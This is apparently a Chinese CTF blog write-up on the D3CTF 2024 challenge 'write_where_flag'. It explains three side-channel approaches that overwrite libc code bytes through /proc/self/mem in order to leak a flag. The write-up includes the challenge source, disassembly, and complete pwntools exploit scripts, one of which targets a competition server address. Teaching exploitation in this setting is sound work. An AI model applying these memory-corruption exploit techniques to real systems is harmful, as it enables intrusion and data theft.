<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./somehash&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">	<span class="keyword">if</span>(script):</span><br><span class="line">		gdb.attach(p, script)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line">		pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		<span class="keyword">return</span> process(elf_path)</span><br><span class="line">	<span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;name length&gt; &#x27;</span>,<span class="string">b&#x27;-152&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">sa(<span class="string">b&#x27;name&gt; &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#.......</span></span><br><span class="line"><span class="comment">#剩下的都是格式化字符串老生常谈的东西了,就不写了</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2024d3ctf-write-where-flag"><a href="#2024d3ctf-write-where-flag" class="headerlink" title="2024d3ctf-write_where_flag"></a>2024d3ctf-write_where_flag</h1><p><strong>标签:侧信道</strong></p>
<p>比较有意思的一道侧信道题目,赛后wp看到了四种解法,但总的算起来其实是三种办法</p>
<p>先分析下题目,附件中给出了源码,以及dockfile(可以自己起一个,把libc拖出来)</p>
<p>其每次会将libc的代码段映射部分信息打印给我们</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">FILE* maps_stream = fopen(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line">  <span class="type">char</span> *line = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">uint64_t</span> len = <span class="number">0</span>;</span><br><span class="line">  <span class="type">uint64_t</span> addr_start = <span class="number">0</span>, addr_end = <span class="number">0</span>, offset = <span class="number">0</span>, major_id = <span class="number">0</span>, minor_id = <span class="number">0</span>, inode_id = <span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> mode[<span class="number">0x10</span>], file_path[<span class="number">0x100</span>];</span><br><span class="line">  <span class="built_in">memset</span>(mode, <span class="number">0</span>, <span class="keyword">sizeof</span>(mode));</span><br><span class="line">  <span class="built_in">memset</span>(file_path, <span class="number">0</span>, <span class="keyword">sizeof</span>(file_path));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (getline(&amp;line, &amp;len, maps_stream) != <span class="number">-1</span> ) &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(line,<span class="string">&quot;%lx-%lx%s%lx%lu:%lu%lu%s&quot;</span>,</span><br><span class="line">      &amp;addr_start, &amp;addr_end, mode, &amp;offset,</span><br><span class="line">      &amp;major_id, &amp;minor_id, &amp;inode_id, file_path</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">10</span>) &#123;</span><br><span class="line">      libc_code_addr_start = addr_start;</span><br><span class="line">      libc_code_addr_end = addr_end;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    count++;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>第10次就好刚好是libc的代码段</p>
<p>之后无限次的允许我们使用flag中的一个字节(未知)去覆盖该段的任意一个字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%lu%u&quot;</span>, &amp;addr, &amp;offset) == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(libc_code_addr_start &lt;= addr &amp;&amp; addr &lt; libc_code_addr_end) ||</span><br><span class="line">        !(offset &gt;= FLAG_PREFIX_LENGTH &amp;&amp; offset &lt; <span class="built_in">strlen</span>(flag) - FLAG_SUFFIX_LENGTH))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    write_mem(addr, flag[offset]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_mem</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint8_t</span> byte)</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">  lseek(fd, addr, SEEK_SET);</span><br><span class="line">  write(fd, &amp;byte, <span class="number">1</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>/proc/self/mem</code>文件允许我们无视映射时的权限对内存进行修改</p>
<h2 id="solution1"><a href="#solution1" class="headerlink" title="solution1"></a>solution1</h2><p>第一种解法这也是比赛时我自己的思路,但可惜没能做出来,因为一些libc中的点没找到</p>
<p>这种思路是利用已知的libc中的机器码中刚好对应ascii字符的,只要我们能够找到<code>a-f0-9</code>所有对应的机器码,这样我们随机将flag中的一个字节覆盖此处时</p>
<p>如果与原先不同,那么程序就会崩溃,以此来判断flag</p>
<p>但这个思路最麻烦的就是:因为要运行到此处,就几乎只能从scanf函数中寻找,而就算scnaf中找到了,程序也不一定会运行到此处,甚至运行到了也不一定会崩溃</p>
<p>这就是这种思路的最大限制,不能方便的找到可用的ascii覆盖目标</p>
<p>最终没能做出来,但赛后看到一篇wp也是这个思路,但是其做出来了</p>
<p><a target="_blank" rel="noopener" href="https://ycznkvrmzo.feishu.cn/docx/LKTtdcWYIov9k1xCawgcGY0knFf">‌⁢⁡⁢‍⁡‬⁤‬‬﻿⁢⁤⁤‍‍﻿⁤⁡‌⁤⁣‬﻿⁤⁢⁢⁣‍⁢‬‬‌﻿‍‬‌⁣2024 04.26 d3ctf wp - LaoGong - 飞书云文档 (feishu.cn)</a>如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-02_160515.png" alt=""></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">to = <span class="number">2.5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">addr, offset</span>):</span><br><span class="line">    addr -= <span class="number">0x26000</span></span><br><span class="line">    <span class="comment"># p = remote(&quot;host&quot;, port)</span></span><br><span class="line">    libc.address = <span class="built_in">int</span>((<span class="string">b&quot;0x&quot;</span> + p.recvuntil(<span class="string">b&quot;-&quot;</span>, drop=<span class="literal">True</span>)).decode(), base=<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&#125;\n&quot;</span>)</span><br><span class="line">    <span class="comment"># info(&quot;libc.address = 0x%x&quot;, libc.address)</span></span><br><span class="line">    <span class="comment"># p.sendline((str(addr + libc.address) + &quot; &quot; + str(offset + 6)).encode())</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline((<span class="built_in">str</span>(addr + libc.address) + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(offset + <span class="number">6</span>)).encode())</span><br><span class="line">        p.recv(<span class="number">1</span>, timeout=to)</span><br><span class="line">        p.sendline((<span class="built_in">str</span>(addr + libc.address) + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(offset + <span class="number">6</span>)).encode())</span><br><span class="line">        p.recv(<span class="number">1</span>, timeout=to)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># p.interactive()</span></span><br><span class="line">        p.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;nocrash&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">    s = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">    res_set = <span class="built_in">set</span>(s)</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> addrs:</span><br><span class="line">        <span class="keyword">if</span> test(addr, i):</span><br><span class="line">            res_set &amp;= <span class="built_in">set</span>(addrs[addr])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res_set -= <span class="built_in">set</span>(addrs[addr])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res_set) == <span class="number">1</span>:</span><br><span class="line">            flag += res_set.pop()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(res_set) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(res_set)</span><br><span class="line">        <span class="keyword">assert</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(flag) </span><br><span class="line">   </span><br><span class="line"><span class="comment"># &#123;0411134c0ddfd04f1a109efc672f54a0053fb206&#125;</span></span><br></pre></td></tr></table></figure>
<p>可以看出来,其并不是直接找到所有ascii对应的机器码</p>
<p>有些位置只用于确认一个集合,这倒是没想到</p>
<h2 id="solution2"><a href="#solution2" class="headerlink" title="solution2"></a>solution2</h2><p>第二种思路确实没想到,有两个解法都是这种思路,简单来说就是修改报错字符串寻址,根据报错字符串的偏移进行侧信道攻击</p>
<p>个人觉得是比较好的一种思路,选择其中一种举例</p>
<p>在stack_chk_fail中会进行字符串打印</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000136720 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000136724 50                            push    rax</span><br><span class="line">.text:0000000000136725 58                            pop     rax</span><br><span class="line">.text:0000000000136726 48 8D 3D FE 51 0A 00          lea     rdi, aStackSmashingD            ; &quot;stack smashing detected&quot;</span><br><span class="line">.text:000000000013672D 48 83 EC 08                   sub     rsp, 8</span><br><span class="line">.text:0000000000136731 E8 0A 00 00 00                call    __fortify_fail</span><br><span class="line">.text:0000000000136731                               ; &#125; // starts at 136720</span><br></pre></td></tr></table></figure>
<p>若我们修改其lea的偏移,就会输出不同的字符串以此来判别flag</p>
<p>问题在于如何进入stack_chk_fail</p>
<p>在scanf中是这样检测的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000060CEF 48 8B 54 24 18                mov     rdx, [rsp+0D8h+var_C0]</span><br><span class="line">.text:0000000000060CF4 64 48 2B 14 25 28 00 00 00    sub     rdx, fs:28h</span><br><span class="line">.text:0000000000060CFD 75 08                         jnz     short loc_60D07</span><br><span class="line">.text:0000000000060CFD</span><br><span class="line">.text:0000000000060CFF 48 81 C4 D8 00 00 00          add     rsp, 0D8h</span><br><span class="line">.text:0000000000060D06 C3                            retn</span><br><span class="line">.text:0000000000060D06</span><br><span class="line">.text:0000000000060D07                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000060D07</span><br><span class="line">.text:0000000000060D07                               loc_60D07:                              ; CODE XREF: scanf+BD↑j</span><br><span class="line">.text:0000000000060D07 E8 14 5A 0D 00                call    __stack_chk_fail</span><br></pre></td></tr></table></figure>
<p>虽然我们无法改变canary,但是如果在取出时,我们覆盖一个字节可以使得取出错误的canary,那么就一定会触发stack_chk_fail</p>
<p>就像这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000060CEF 48 8B 54 24 32                mov     rdx, [rsp+0D8h+var_A8+2]</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.terminal = [&quot;zellij&quot;, &quot;action&quot;, &quot;new-pane&quot;, &quot;-d&quot;, &quot;down&quot;, &quot;-c&quot;, &quot;--&quot;, &quot;zsh&quot;, &quot;-c&quot;]</span></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">exe_path = (<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">exe = context.binary = ELF(exe_path)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;47.103.122.127&#x27;</span></span><br><span class="line">port = <span class="number">30217</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># host = &quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="comment"># port = 9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if sys.argv[1] == &#x27;r&#x27;:</span></span><br><span class="line"><span class="comment">#     p = remote(host, port)</span></span><br><span class="line"><span class="comment"># elif sys.argv[1] == &#x27;p&#x27;:</span></span><br><span class="line"><span class="comment">#     p = process(exe_path)  </span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     p = gdb.debug(exe_path, &#x27;b *$rebase(0x170c)&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one_gadget</span>(<span class="params">filename, base_addr=<span class="number">0</span></span>):</span><br><span class="line">  <span class="keyword">return</span> [(<span class="built_in">int</span>(i, p)+base_addr) <span class="keyword">for</span> i <span class="keyword">in</span> subprocess.check_output([<span class="string">&#x27;one_gadget&#x27;</span>, <span class="string">&#x27;--raw&#x27;</span>, filename]).decode().split(<span class="string">&#x27; &#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gdb_pause</span>(<span class="params">p</span>):</span><br><span class="line">    gdb.attach(p)  </span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">idx, p</span>):</span><br><span class="line">    libc.address = <span class="built_in">int</span>(<span class="string">b&quot;0x&quot;</span>+(p.recv(<span class="number">12</span>)), <span class="number">16</span>)-<span class="number">0x26000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(hex(libc.address+0x5c57d))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&#125;&#125;&quot;</span>, <span class="built_in">str</span>(libc.address+<span class="number">0x138f39</span>)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="comment"># p.sendlineafter(b&quot;&#125;&#125;&quot;, str(libc.address+0x137c92)+&quot; &quot;+str(5))</span></span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.address+<span class="number">0x5c57d</span>)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.address+<span class="number">0x5c57d</span>)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> p.recvall()[<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># f = open(&quot;./turn&quot;, &quot;w&quot;)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;d3ctf&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">60</span>):</span><br><span class="line">    p = remote(host, port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = pwn(i, p)[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> res == <span class="string">b&quot;ktr&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;a&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;tra&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;b&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;rac&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;c&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;ace&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;d&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;ces&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;e&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;esy&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;f&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;ed &quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;1&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;d s&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;2&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot; st&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;3&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;sta&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;4&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;tac&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;5&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;ack&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;6&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;ck &quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;7&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;k f&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;8&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot; fr&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;9&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> res == <span class="string">b&quot;zed&quot;</span>:</span><br><span class="line">            flag += <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># f.write(str(i))</span></span><br><span class="line">        <span class="comment"># f.write(res.decode())</span></span><br><span class="line">        <span class="comment"># f.write(&quot;\n&quot;)</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="comment"># f.close()</span></span><br><span class="line">flag+= <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure>
<p>另外一种大差不差,只不过是用vtable报错,但更不好想</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5OTUzNDY2Nw==&amp;mid=2247484107&amp;idx=1&amp;sn=46d493e9685702515b514325db8ebca0&amp;chksm=c05098eff72711f979f1db15f2c22017383f8f3f5078b65c7ede96be75b11720a1a0cf3d401f&amp;mpshare=1&amp;scene=23&amp;srcid=0429KRSmkPyt4kmBPl5s657E&amp;sharer_shareinfo=cf93709293538b1626fda061b971ff8d&amp;sharer_shareinfo_first=cf93709293538b1626fda061b971ff8d#rd">D^3CTF WP (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/75/#Write+flag+where">D^3CTF 2024 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>
<h2 id="solution3"><a href="#solution3" class="headerlink" title="solution3"></a>solution3</h2><p>解法3也就是官方给出的解法</p>
<p>查看scanf源代码，可以看到以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">case</span> <span class="title function_">L_</span><span class="params">(<span class="string">&#x27;u&#x27;</span>)</span>:        <span class="comment">/* Unsigned decimal integer.  */</span></span><br><span class="line">          base = <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">goto</span> number;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="title function_">L_</span><span class="params">(<span class="string">&#x27;d&#x27;</span>)</span>:        <span class="comment">/* Signed decimal integer.  */</span></span><br><span class="line">          base = <span class="number">10</span>;</span><br><span class="line">          flags |= NUMBER_SIGNED;</span><br><span class="line">          <span class="keyword">goto</span> number;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="title function_">L_</span><span class="params">(<span class="string">&#x27;i&#x27;</span>)</span>:        <span class="comment">/* Generic number.  */</span></span><br><span class="line">          base = <span class="number">0</span>;</span><br><span class="line">          flags |= NUMBER_SIGNED;</span><br><span class="line"></span><br><span class="line">        number:</span><br><span class="line">          c = inchar ();</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (c == EOF))</span><br><span class="line">            input_error ();</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Check for a sign.  */</span></span><br><span class="line">          <span class="keyword">if</span> (c == L_(<span class="string">&#x27;-&#x27;</span>) || c == L_(<span class="string">&#x27;+&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              char_buffer_add (&amp;charbuf, c);</span><br><span class="line">              <span class="keyword">if</span> (width &gt; <span class="number">0</span>)</span><br><span class="line">                --width;</span><br><span class="line">              c = inchar ();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
